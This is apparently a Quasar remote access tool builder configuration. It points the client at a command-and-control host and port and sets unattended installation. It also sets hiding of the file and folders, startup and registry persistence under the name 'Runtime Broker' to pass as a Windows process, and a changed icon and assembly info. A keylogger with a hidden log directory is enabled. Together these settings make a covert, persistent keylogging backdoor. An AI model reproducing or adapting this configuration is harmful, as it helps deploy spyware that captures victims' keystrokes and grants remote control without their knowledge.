<settings>
  <Tag>Runtime</Tag>
  <Hosts>192.168.192.14:4782;</Hosts>
  <Delay>3000</Delay>
  <Mutex>930fa71a-3658-44c7-a4dd-d20d07c14c4d</Mutex>
  <UnattendedMode>True</UnattendedMode>
  <InstallClient>True</InstallClient>
  <InstallName>Runtime Broker</InstallName>
  <InstallPath>1</InstallPath>
  <InstallSub>Windows</InstallSub>
  <HideFile>True</HideFile>
  <HideSubDirectory>True</HideSubDirectory>
  <AddStartup>True</AddStartup>
  <RegistryName>Runtime Broker</RegistryName>
  <ChangeIcon>True</ChangeIcon>
  <IconPath>C:\Users\kubag\Downloads\iconquasar.ico</IconPath>
  <ChangeAsmInfo>True</ChangeAsmInfo>
  <Keylogger>True</Keylogger>
  <LogDirectoryName>Usage</LogDirectoryName>
  <HideLogDirectory>True</HideLogDirectory>
  <ProductName>Quasar</ProductName>
  <Description>Quasar Server</Description>
  <CompanyName>
  </CompanyName>
  <Copyright>Copyright @ MaxXor 2023</Copyright>
  <Trademarks>
  </Trademarks>
  <OriginalFilename>Quasar.exe</OriginalFilename>
  <ProductVersion>1.4.1.0</ProductVersion>
  <FileVersion>1.4.1.0</FileVersion>
</settings>